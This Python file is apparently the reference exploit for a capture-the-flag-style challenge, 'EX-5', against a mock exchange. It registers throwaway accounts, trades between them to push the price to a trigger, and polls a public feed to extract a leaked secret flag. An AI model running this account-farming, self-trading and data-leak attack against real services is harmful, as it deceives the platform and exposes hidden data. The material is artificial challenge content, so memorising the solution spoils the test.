#!/usr/bin/env python3
"""Reference exploit for EX-5 activation feed sampleage.

The exploit uses ordinary public HTTP APIs only. It can create simple market
movement with attacker orders, then polls the public feed route by sequence and
prints only the recovered signal context flag.
"""

from __future__ import annotations

import json
import secrets
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import Any, Mapping


TIMEOUT = 5
ATTACKER_NOTE = "ex5-market-move"


class ExploitError(Exception):
    pass


def main(argv: list[str]) -> int:
    if len(argv) != 3:
        print("usage: ex_activation_feed.py <host> <attack-data-json>", file=sys.stderr)
        return 2

    try:
        host = normalize_base_url(argv[1])
        attack_data = parse_attack_data(argv[2])
        token = register_attacker(host)
        maybe_move_market(host, token, attack_data)
        flag = poll_feed_for_flag(host, attack_data)
    except ExploitError as error:
        print(str(error), file=sys.stderr)
        return 1

    print(flag)
    return 0


def parse_attack_data(raw: str) -> Mapping[str, Any]:
    try:
        data = json.loads(raw)
    except json.JSONDecodeError as error:
        raise ExploitError("invalid attack data") from error
    if not isinstance(data, Mapping):
        raise ExploitError("attack data must be an object")
    if isinstance(data.get("public"), Mapping):
        data = data["public"]
    if data.get("place") not in (4, "4") and data.get("ex_id") != "EX-5":
        raise ExploitError("attack data is not for place 4")
    return data


def register_attacker(host: str, label: str = "attacker") -> str:
    nonce = secrets.token_hex(8)
    response = request_json(
        host,
        "POST",
        "/api/auth/register",
        payload={
            "username": f"ex5-{label}-{nonce}",
            "password": f"Vx-{secrets.token_urlsafe(18)}",
            "account_profile": "spot",
        },
    )
    token = response.get("session", {}).get("token") if isinstance(response.get("session"), Mapping) else None
    if not isinstance(token, str) or not token:
        raise ExploitError("attacker registration failed")
    faucet(host, token, f"ex5-faucet-{nonce}")
    return token


def faucet(host: str, token: str, idempotency_key: str) -> None:
    request_json(
        host,
        "POST",
        "/api/faucet",
        payload={"idempotency_key": idempotency_key},
        token=token,
    )


def maybe_move_market(host: str, token: str, attack_data: Mapping[str, Any]) -> None:
    price = movement_price(attack_data)
    quantity = attack_data.get("quantity") or "1.00000000"
    market_symbol = attack_data.get("market") or attack_data.get("market_symbol")
    if not all(isinstance(value, str) and value for value in (price, quantity, market_symbol)):
        return

    buyer_token = register_attacker(host, "buyer")
    nonce = secrets.token_hex(5)
    place_order(
        host,
        token,
        market_symbol=market_symbol,
        side="sell",
        price=price,
        quantity=quantity,
        client_order_id=f"ex5-sell-{nonce}",
    )
    place_order(
        host,
        buyer_token,
        market_symbol=market_symbol,
        side="buy",
        price=price,
        quantity=quantity,
        client_order_id=f"ex5-buy-{nonce}",
    )


def place_order(
    host: str,
    token: str,
    *,
    market_symbol: str,
    side: str,
    price: str,
    quantity: str,
    client_order_id: str,
) -> None:
    reference_code = client_order_id
    request_json(
        host,
        "POST",
        "/api/orders",
        payload={
            "market_symbol": market_symbol,
            "side": side,
            "order_type": "limit",
            "limit_price": price,
            "quantity": quantity,
            "order_ref": reference_code,
            "reference_code": reference_code,
            "client_order_id": reference_code,
            "execution_memo": ATTACKER_NOTE,
        },
        token=token,
    )


def movement_price(attack_data: Mapping[str, Any]) -> str | None:
    bucket = attack_data.get("trigger_bucket")
    if isinstance(bucket, str) and "-" in bucket:
        _lower, upper = bucket.split("-", 1)
        upper = upper.strip()
        return upper or None

    value = attack_data.get("trigger_price") or attack_data.get("price") or attack_data.get("limit_price")
    return value if isinstance(value, str) and value else None


def poll_feed_for_flag(host: str, attack_data: Mapping[str, Any]) -> str:
    market_symbol = required_string(attack_data, "market", fallback_key="market_symbol")
    anchor_sequence = required_sequence(attack_data, "since_sequence", "after_sequence")
    since_sequence = str(anchor_sequence)
    for _attempt in range(20):
        query = urllib.parse.urlencode(
            {
                "market": market_symbol,
                "since_sequence": since_sequence,
                "limit": "100",
            }
        )
        response = request_json(host, "GET", f"/api/feed/public?{query}")
        events = response.get("events")
        if not isinstance(events, list):
            raise ExploitError("feed response missing")
        for event in events:
            if not isinstance(event, Mapping) or event.get("event_type") != "market_signal_activated":
                continue
            event_sequence = optional_sequence(event.get("sequence"))
            if event_sequence is None or event_sequence <= anchor_sequence:
                continue
            payload = event.get("payload")
            if not isinstance(payload, Mapping):
                continue
            expected_id = attack_data.get("conditional_order_id")
            observed_id = payload.get("conditional_order_id")
            if expected_id not in (None, "") and str(observed_id) != str(expected_id):
                continue
            value = activation_marker_from(payload)
            if isinstance(value, str) and value and value != ATTACKER_NOTE:
                return value
        time.sleep(0.25)
    raise ExploitError("flag not found in public feed")


def activation_marker_from(value: Any) -> str | None:
    if isinstance(value, Mapping):
        for key in ("signal_context", "activation_marker", "trigger_profile"):
            direct = value.get(key)
            if isinstance(direct, str) and direct:
                return direct
        for child in value.values():
            found = activation_marker_from(child)
            if found:
                return found
    elif isinstance(value, list):
        for child in value:
            found = activation_marker_from(child)
            if found:
                return found
    return None


def request_json(
    host: str,
    method: str,
    path: str,
    *,
    payload: Mapping[str, Any] | None = None,
    token: str | None = None,
) -> Mapping[str, Any]:
    body = None
    headers = {"Accept": "application/json"}
    if payload is not None:
        body = json.dumps(payload, sort_keys=True, separators=(",", ":")).encode("utf-8")
        headers["Content-Type"] = "application/json"
    if token:
        headers["Authorization"] = f"Bearer {token}"

    last_error: Exception | None = None
    for _attempt in range(3):
        request = urllib.request.Request(host + path, data=body, headers=headers, method=method)
        try:
            with urllib.request.urlopen(request, timeout=TIMEOUT) as response:
                raw = response.read()
                break
        except urllib.error.HTTPError as error:
            if error.code < 500:
                raise ExploitError(f"unexpected HTTP status {error.code}") from error
            last_error = error
        except OSError as error:
            last_error = error
    else:
        raise ExploitError("service unavailable") from last_error

    try:
        data = json.loads(raw.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError) as error:
        raise ExploitError("invalid JSON response") from error
    if not isinstance(data, Mapping):
        raise ExploitError("JSON response must be an object")
    return data


def required_string(data: Mapping[str, Any], key: str, *, fallback_key: str | None = None) -> str:
    value = data.get(key)
    if (not isinstance(value, str) or not value) and fallback_key:
        value = data.get(fallback_key)
    if not isinstance(value, str) or not value:
        raise ExploitError(f"{key} missing")
    return value


def required_sequence(data: Mapping[str, Any], *keys: str) -> int:
    for key in keys:
        parsed = optional_sequence(data.get(key))
        if parsed is not None:
            return parsed
    raise ExploitError("since_sequence missing")


def optional_sequence(value: Any) -> int | None:
    if isinstance(value, int) and not isinstance(value, bool) and value >= 0:
        return value
    if isinstance(value, str) and value.isdigit():
        return int(value, 10)
    return None


def normalize_base_url(host: str) -> str:
    if not host:
        raise ExploitError("host is required")
    host = host.strip()
    if not host.startswith(("http://", "https://")):
        host = "http://" + host
    return host.rstrip("/")


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
